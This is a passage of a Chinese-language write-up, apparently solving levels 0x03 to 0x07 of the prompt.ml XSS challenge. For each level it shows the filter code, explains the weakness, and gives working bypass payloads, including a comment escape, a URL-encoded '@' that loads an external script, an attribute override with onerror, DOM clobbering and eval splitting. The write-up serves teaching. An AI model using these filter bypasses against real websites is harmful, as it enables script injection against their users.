class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential comment end delimiters</span></span><br><span class="line">    input = input.replace(<span class="regexp">/-&gt;/g</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comment the input to avoid script execution</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-4"><a class="markdownIt-Anchor" href="#2-题目分析-4"></a> <code>② 题目分析</code></h4><blockquote><p>JS 代码通过 <code>replace</code> 函数的替换规则，将 <code>-&gt;</code> 替换为 <code>_</code>，但是这道题目就是为了逃逸出 <code>&lt;!-- --&gt;</code> 注释，那么应该怎么逃出来呢？</p></blockquote><h4 id="3-相关知识点-4"><a class="markdownIt-Anchor" href="#3-相关知识点-4"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li><code>&lt;!-- --&gt;</code> 和 <code>&lt;!-- --!&gt;</code> 的功能以及区别，html注释支持以下两种方式：<ul><li><code>&lt;!-- xxx --&gt;</code></li><li><code>&lt;!-- xxx --!&gt;</code></li></ul></li></ol></blockquote><h4 id="4-payload-4"><a class="markdownIt-Anchor" href="#4-payload-4"></a> <code>④ payload</code></h4><blockquote><p>根据<code>相关知识点</code>，我们可以这样构造 payload：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//</span><br></pre></td></tr></table></figure><h4 id="5-html-source-4"><a class="markdownIt-Anchor" href="#5-html-source-4"></a> <code>⑤ HTML source</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --!&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="comment">// --&gt;</span></span><br></pre></td></tr></table></figure><h4 id="6-xss-类型-4"><a class="markdownIt-Anchor" href="#6-xss-类型-4"></a> <code>⑥ xss 类型</code></h4><blockquote><p>这是一道闭合注释类型的题目，后面还有两道。</p></blockquote><h3 id="font-color-navy0x04-url-编码绕过font"><a class="markdownIt-Anchor" href="#font-color-navy0x04-url-编码绕过font"></a> <font color="navy">0x04 URL 编码绕过</font></h3><h4 id="1-js-代码-5"><a class="markdownIt-Anchor" href="#1-js-代码-5"></a> <code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-5"><a class="markdownIt-Anchor" href="#2-题目分析-5"></a> <code>② 题目分析</code></h4><blockquote><p>先看这一行：</p><p><code>if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))){}</code></p><p>说明输入一定要符合正则表达式中的格式：</p><p><code>http(s可有可无)://prompt.ml/</code></p><p>如果输入字符串的部分（i）格式符合上述格式，JS 代码接着就会建立 <code>&lt;script&gt;</code> 标签，并且它的 <code>src</code> 属性等于输入的网址，然后返回的是网页上的输出内容。所以我们需要引入外部文件中的脚本中要含有：<code>prompt(1)</code>。</p></blockquote><h4 id="3-相关知识点-5"><a class="markdownIt-Anchor" href="#3-相关知识点-5"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li><code>URI</code> 完整的格式，以及符号 @ 的作用；</li><li><code>decodeURIComponent()</code> 函数的作用，以及 <code>escape</code> 、<code>encodeURIComponent</code>、<code>decodeURIComponent</code> 和 <code>unescape</code> 函数的功能；</li><li><code>Basic Auth 语法</code></li><li>正则表达式后的 <code>i</code>、<code>g</code>、<code>gi</code>、<code>ig</code> 和 <code>m</code> 的含义：</li></ol><ul><li><code>i</code>：忽略大小写</li><li><code>g</code>：全文查找出现的所有匹配字符</li><li><code>gi</code> 和 <code>ig</code>：全文查找、忽略大小写</li><li><code>m</code>：多行查找</li></ul></blockquote><h4 id="4-payload-5"><a class="markdownIt-Anchor" href="#4-payload-5"></a> <code>④ payload</code></h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://prompt.ml%2f:pwd@localhost/xss.js</span></span><br></pre></td></tr></table></figure><blockquote><p>如果我们输入的 payload 必须完全符合  JS 代码中的限制，那么就得是这个形式：</p><p><code>https://prompt.ml/@localhost/xss.js</code></p><p>但是浏览器识别的正确 URI 是这样的：</p><p><img src="/images/95-1.png" alt></p><p>综上考虑，我们的输入必须要满足的<code>两个条件相互矛盾</code>，但是我们可以利用 <code>decodeURIComponent()</code> 函数的功能：<code>将一些符号的 URL 编码解码为对应的符号</code>，那么我们的输入就可以将 <code>@</code> 前面的 <code>/</code>  符号写成它的 URL 编码：<code>%2f</code>，因此得到上述的 payload。</p><p><code>注明</code>：</p><ul><li>此 payload 在谷歌浏览器上可能不会正常执行，因为 chrome 在 2017 年规定<a href="https://www.chromestatus.com/feature/5669008342777856" target="_blank" rel="noopener"><code>内嵌资源不让加用户名密码了</code></a>，所以上述的 payload 需要在火狐浏览器才能被执行。</li><li>若要追求最短 payload ，密码部分 <code>pwd</code> 是可以不要的，但是 <code>:</code> 和 <code>@</code> 必须保留，且根据 <a href="http://blog.httpwatch.com/2010/02/10/using-protocol-relative-urls-to-switch-between-http-and-https/" target="_blank" rel="noopener">相对协议地址</a> 原理，<code>http:</code> 也是可以不要的。</li></ul></blockquote><h4 id="5-html-source-5"><a class="markdownIt-Anchor" href="#5-html-source-5"></a> <code>⑤ HTML source</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://prompt.ml%2f@muzibing.github.io/xss.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="6-xss-类型-5"><a class="markdownIt-Anchor" href="#6-xss-类型-5"></a> <code>⑥ xss 类型</code></h4><blockquote><p>利用 <code>URI</code> 格式的特性以及函数的功能的 <code>URL编码绕过</code> 题目。</p></blockquote><h3 id="font-color-navy0x05-属性覆盖及换行绕过font"><a class="markdownIt-Anchor" href="#font-color-navy0x05-属性覆盖及换行绕过font"></a> <font color="navy">0x05 属性覆盖及换行绕过</font></h3><h4 id="1-js-代码-6"><a class="markdownIt-Anchor" href="#1-js-代码-6"></a> <code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-6"><a class="markdownIt-Anchor" href="#2-题目分析-6"></a> <code>② 题目分析</code></h4><blockquote><p>JS 代码对 <code>&gt;</code>、<code>on* =</code>和 <code>focus</code> 对大小写不敏感的进行全局匹配，然后将输入放到 <code>input</code> 中的 <code>value</code> 值中。</p></blockquote><h4 id="3-相关知识点-6"><a class="markdownIt-Anchor" href="#3-相关知识点-6"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li>对 &lt;input&gt; 标签属性的覆盖：以第一个出现的为真实值（第一个出现的属性值将后续相同属性名的值进行覆盖）；</li><li>事件（还包括标签名，属性等）与等号可以不在一行，一样会被执行；</li></ol></blockquote><h4 id="4-payload-6"><a class="markdownIt-Anchor" href="#4-payload-6"></a> <code>④ payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">" type="image" src="2" onerror </span><br><span class="line">=prompt(1)"</span><br><span class="line"></span><br><span class="line">=======================================</span><br><span class="line">还可以写成如下，也可以执行：</span><br><span class="line">" type=</span><br><span class="line">"image" </span><br><span class="line">src=</span><br><span class="line">"2" </span><br><span class="line">onerror </span><br><span class="line">=</span><br><span class="line">prompt(1)  "</span><br></pre></td></tr></table></figure><blockquote><p>其实 <code>type=&quot;text&quot;</code> 就是个提示，input 标签可根据 type 改变自身为不同的元素类型，从而可以使用该类型的的属性触发 js 。题目设定的默认类型是 text ，即输入框，这种类型可以触发 js 的属性只有 <code>onfocus</code>，但是 focus 被过滤了，所以需要使用其他类型。通过对属性 <code>type</code> 值的覆盖，使得 <code>input</code> 的属性变为 <code>image</code> ，通过加载图片有误，触发 <code>onerror</code> 事件。</p></blockquote><h4 id="5-html-source-6"><a class="markdownIt-Anchor" href="#5-html-source-6"></a> <code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">src</span>=<span class="string">"2"</span> <span class="attr">onerror</span> </span></span><br><span class="line"><span class="tag">=<span class="string">prompt(1)</span>"" <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="6-xss-类型-6"><a class="markdownIt-Anchor" href="#6-xss-类型-6"></a> <code>⑥ xss 类型</code></h4><blockquote><p><code>input</code> 属性值的覆盖类型题目</p></blockquote><h3 id="font-color-navy0x06-dom-破坏font"><a class="markdownIt-Anchor" href="#font-color-navy0x06-dom-破坏font"></a> <font color="navy">0x06 DOM 破坏</font></h3><h4 id="1-js-代码-7"><a class="markdownIt-Anchor" href="#1-js-代码-7"></a> <code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-7"><a class="markdownIt-Anchor" href="#2-题目分析-7"></a> <code>② 题目分析</code></h4><blockquote><p><code>try</code> 模块内的代码主要功能是：将输入的字符串划分为两部分，一部分是 <code>URI</code>，另一个部分是 <code>JSON</code> 数据，再建立一个<code>form</code> 标签，将 URL 赋值给 <code>action</code> 属性，对 <code>method</code> 赋值 <code>post</code> 方法。如果 <code>form</code> 中的 <code>action</code> 属性是伪协议就输出 <code>Action forbideen</code>。</p><ul><li>输入内容以 <code>#</code> 分隔</li><li>左侧内容放入 <code>&lt;form&gt;</code> 的 <code>action</code> 属性</li><li>右侧内容是 json 格式，每一对 key-val 构造成 <code>&lt;form&gt;</code> 内的一个 <code>&lt;input&gt;</code> 子标签，其中 key 作为 <code>&lt;input&gt;</code> 的 <code>name</code> 属性值、val 作为 <code>input</code> 的 <code>value</code> 属性值</li><li>只要 <code>&lt;form&gt;</code> 的 <code>action</code> 属性值通过正则校验，则会调用 <code>&lt;form&gt;</code> 的 <code>submit()</code> 函数触发 <code>action</code> 行为</li></ul><p>要在 <code>&lt;form&gt;</code> 的 <code>action 属性</code>执行 javascript 代码，可以构造这样的 payload：</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)#&#123;"EXP":"M02"&#125;</span><br></pre></td></tr></table></figure><blockquote><p>但是由于 <code>document.forms[0].action</code> 的内容被正则过滤了，导致 <code>javascript:alert(1)</code> 无法执行。但是这个过滤是不完善的，可以绕过。关键在于 <code>document.forms[0].action</code> 的指向。当 <code>&lt;form&gt;</code> 的子标签中没有任何名为 <code>&lt;action&gt;</code> 的子标签时， <code>document.forms[0].action</code> 指向的就是 <code>&lt;form&gt;</code> 自身的 <code>action</code> 属性。但若 <code>&lt;form&gt;</code> 的子标签中，有任一子标签名为 <code>&lt;action&gt;</code> 时， <code>document.forms[0].action</code> 会优先指向该子标签。这样，正则过滤所校验的值就是子标签 <code>&lt;action&gt;</code> 的值，而非 <code>&lt;form&gt;</code> 标签自身的 <code>action</code> 属性。</p></blockquote><h4 id="3-相关知识点-7"><a class="markdownIt-Anchor" href="#3-相关知识点-7"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li>DOM 破坏后，<code>form</code> 标签中属性<code>ID</code> 和 <code>name</code>的变化</li></ol><ul><li><code>如果form元素的某个属性名和 input 元素的 id/name 值一样，那么该 form 的属性就会被 input 元素的属性值所覆盖。</code></li><li>并不是某些博客中所写的：<code>action有这样的一个特性，如果前后都有action，访问action标签时访问的是后面的action的值。</code>。而且在同一个标签中，存在相同名称的属性，第一个出现的属性值将后续相同属性名的值进行覆盖；</li></ul><ol start="2"><li><code>JSON 数据</code>的读取函数：<code>JSON.parseInt()</code></li><li><code>form 标签</code>的 <code>action 属性</code>以及其他知识点</li></ol></blockquote><h4 id="4-payload-7"><a class="markdownIt-Anchor" href="#4-payload-7"></a> <code>④ payload</code></h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;"action":"text"&#125;</span><br></pre></td></tr></table></figure><blockquote><p>payload 被分解成如下 <code>HTML source</code> 的形式：</p><p><code>&lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;text&quot;&gt;&lt;/form&gt;</code></p><p>将前面的伪协议添加 <code>action</code> 的属性值，并将 <code>JSON</code> 数据中的 <code>&quot;action&quot;</code> 赋值给 <code>input</code> 标签中的 <code>name</code> 属性，并将 <code>text</code> 赋值给 <code>value</code> 值。因为 <code>DOM</code> 被破坏，所以 <code>document.forms[0].action</code> 的 <code>action</code> 是 <code>input</code> 中的 <code>name</code> 的 <code>action</code>，为<code>object HTMLInputElement</code> 所以 <code>if</code> 条件为真，执行 <code>document.forms[0].submit()</code> ，向 <code>javascript:prompt</code> 提交表单，成功执行脚本。</p><p>虽然题目会把我们输入的 json 构造成 <code>&lt;form&gt;</code> 内的 <code>&lt;input&gt;</code> 子标签，但是我们无法直接构造标签名为 <code>&lt;action&gt;</code> 。不过 json 的 key 会作为 <code>&lt;action&gt;</code> 标签的 <code>name</code> 属性值，而我们恰恰可以通过 <code>name</code> 属性为标签更名。</p><p>例如 <code>&lt;input name=&quot;action&quot;&gt;</code> 的名字实际是 action ，而非 input 。于是我们可以构造这样的 payload 绕过针对 action 的正则过滤：<code>javascript:alert(1)#{&quot;action&quot;:&quot;EXP&quot;}</code>。至此，只需要把 alert 改成 prompt 即可完成挑战，最终 payload 为：<code>javascript:prompt(1)#{&quot;action&quot;:&quot;EXP&quot;}</code></p></blockquote><h4 id="5-html-source-7"><a class="markdownIt-Anchor" href="#5-html-source-7"></a> <code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"javascript:prompt(1)"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"action"</span> <span class="attr">value</span>=<span class="string">"text"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>                         </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">                                                  </span></span><br><span class="line"><span class="actionscript">    <span class="comment">// forbid javascript: or vbscript: and data: stuff    </span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (!<span class="regexp">/script:|data:/i</span>.test(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)) </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();                       </span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span>                                                  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">"Action forbidden."</span>)               </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>                         </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">                                                  </span></span><br><span class="line"><span class="actionscript">    <span class="comment">// forbid javascript: or vbscript: and data: stuff    </span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (!<span class="regexp">/script:|data:/i</span>.test(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)) </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();                       </span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span>                                                  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">"Action forbidden."</span>)               </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="6-xss-类型-7"><a class="markdownIt-Anchor" href="#6-xss-类型-7"></a> <code>⑥ xss 类型</code></h4><blockquote><p>通过破坏 DOM，使得 id 和 name 属性混乱，达到绕过的作用。</p></blockquote><h3 id="font-color-navy0x07-注释绕过-号绕过font"><a class="markdownIt-Anchor" href="#font-color-navy0x07-注释绕过-号绕过font"></a> <font color="navy">0x07 注释绕过 / # 号绕过</font></h3><h4 id="1-js-代码-8"><a class="markdownIt-Anchor" href="#1-js-代码-8"></a> <code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-题目分析-8"><a class="markdownIt-Anchor" href="#2-题目分析-8"></a> <code>② 题目分析</code></h4><blockquote><p>以 <code>#</code> 号为标志，划分自字符串，并将划分后得到的每个字符串放在 <code>&lt;title&gt;</code> 标签内部，且每个标签 <code>title</code> 内部的字符串长度不能大于 <code>12</code>。</p></blockquote><h4 id="3-相关知识点-8"><a class="markdownIt-Anchor" href="#3-相关知识点-8"></a> <code>③ 相关知识点</code></h4><blockquote><ol><li>javascript的``模板字符串</li><li>eval 函数的特性</li><li>JavaScript 的特点：<ul><li>在 HTML 语境中，<code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 标签之间的内容默认视为 js 代码</li><li>js 代码换行后依然会自动拼接并生效（但是函数名/变量名要完整，不能破开到两行）</li><li>js 代码内容之间的注释会被自动忽略</li></ul></li><li>&lt;svg&gt; 的特性</li></ol></blockquote><h4 id="4-payload-8"><a class="markdownIt-Anchor" href="#4-payload-8"></a> <code>④ payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1:"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">`#<span class="subst">$&#123;prompt(<span class="number">1</span>)&#125;</span>#`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>// javascript的``模板字符串</span><br><span class="line">payload2:"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="comment">/*#*/</span>a=<span class="string">'prom'</span><span class="comment">/*#*/</span>+<span class="string">'pt(1)'</span><span class="comment">/*#*/</span><span class="built_in">eval</span>(a)<span class="comment">/*#*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//eval 函数的特性</span><br><span class="line">payload3:"&gt;<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">a</span>=<span class="string">'#'</span><span class="attr">onload</span>=<span class="string">'/*#*/prompt(1)'</span>// 官方答案</span></span><br><span class="line"><span class="tag"><span class="attr">payload4:</span>"&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="comment">/*#*/</span>prompt(<span class="comment">/*#*/</span><span class="number">1</span>)<span class="comment">/*#*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="5-html-source-8"><a class="markdownIt-Anchor" href="#5-html-source-8"></a> <code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">payload1_HTML_soure:</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">`"&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"$&#123;prompt(1)&#125;"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">=============================================</span><br><span class="line">payload2_HTML_soure:</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">/*"&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/a='prom'/*"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/+'pt(1)'/*"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/eval(a)/*"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">=============================================</span><br><span class="line">payload3_HTML_soure:</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">a</span>=<span class="string">'"&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;p class="comment" title="'</span><span class="attr">onload</span>=<span class="string">'/*"&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;p class="comment" title="*/prompt(1)'</span>"&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">=============================================</span><br><span class="line">payload4_HTML_soure:</span><br><span 